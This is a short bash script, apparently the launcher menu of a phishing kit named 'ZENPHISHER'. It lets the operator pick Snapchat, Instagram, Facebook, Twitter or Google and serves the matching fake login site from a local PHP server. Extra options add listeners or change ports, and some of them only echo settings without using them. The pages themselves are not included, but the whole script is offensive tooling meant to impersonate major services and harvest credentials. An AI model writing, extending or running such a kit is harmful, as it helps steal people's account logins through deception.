#!/bin/bash

# --- Clear screen for a clean look ---
clear

# --- Displaying a fancy welcome message ---
echo -e "\e[1;32m===================================="
echo -e "      ZENPHISHER - by YOU 😈        "
echo -e "===================================="
echo -e "\n\e[1;34mChoose a target to deploy:"

# --- Show available phishing targets ---
echo -e "1) Snapchat \e[1;33m(crypto design)"
echo -e "2) Instagram \e[1;33m(crypto design)"
echo -e "3) Facebook \e[1;33m(crypto design)"
echo -e "4) Twitter \e[1;33m(crypto design)"
echo -e "5) Google \e[1;33m(crypto design)"
echo -e "6) Advanced Settings"
echo -e "7) Exit\n"

# --- Read user input ---
read -p "Option: " opt

# --- Handle different user choices ---
case $opt in
  1)
    echo -e "\e[1;32mStarting Snapchat phishing page..."
    cd sites/snapchat
    php -S 127.0.0.1:8080
    ;;
  2)
    echo -e "\e[1;32mStarting Instagram phishing page..."
    cd sites/instagram
    php -S 127.0.0.1:8080
    ;;
  3)
    echo -e "\e[1;32mStarting Facebook phishing page..."
    cd sites/facebook
    php -S 127.0.0.1:8080
    ;;
  4)
    echo -e "\e[1;32mStarting Twitter phishing page..."
    cd sites/twitter
    php -S 127.0.0.1:8080
    ;;
  5)
    echo -e "\e[1;32mStarting Google phishing page..."
    cd sites/google
    php -S 127.0.0.1:8080
    ;;
  6)
    echo -e "\n\e[1;33mAdvanced Settings:"
    echo -e "1) Customize URL"
    echo -e "2) Set up multiple listeners"
    echo -e "3) Change server port"
    echo -e "4) Back to main menu"
    read -p "Select an advanced option: " adv_opt

    case $adv_opt in
      1)
        read -p "Enter new target URL (e.g. http://127.0.0.1): " custom_url
        echo -e "Custom URL set to: $custom_url"
        ;;
      2)
        read -p "Enter number of listeners (e.g. 3): " num_listeners
        echo -e "Setting up $num_listeners listeners on different ports..."
        for i in $(seq 1 $num_listeners); do
          port=$((8080 + $i))
          php -S 127.0.0.1:$port &
        done
        ;;
      3)
        read -p "Enter new server port (e.g. 8080): " server_port
        echo -e "Server port changed to: $server_port"
        php -S 127.0.0.1:$server_port
        ;;
      4)
        exec $0  # Return to the main menu
        ;;
      *)
        echo -e "Invalid Option. Returning to main menu."
        exec $0
        ;;
    esac
    ;;
  7)
    echo -e "\e[1;31mExiting...\e[0m"
    exit
    ;;
  *)
    echo -e "\e[1;31mInvalid Option! Please select a valid option.\e[0m"
    exec $0
    ;;
esac
